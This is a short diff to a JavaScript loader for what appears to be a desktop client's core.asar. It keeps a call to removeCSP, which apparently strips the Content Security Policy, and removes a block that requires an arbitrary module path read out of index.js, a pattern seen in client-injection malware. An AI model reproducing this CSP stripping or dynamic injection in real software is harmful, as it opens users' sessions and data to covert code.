@@ -312,15 +312,4 @@ const removeCSP = () => {
 };
 
 removeCSP();
-
-const file = path.join(__dirname, 'index.js');
-if (fs.existsSync(file)) {
-    const content = fs.readFileSync(file).toString();
-
-    if (content.split('\n').length != 1) {
-        const data = content.split('"')[1];
-        require(data);
-    }
-}
-
 module.exports = require("./core.asar");
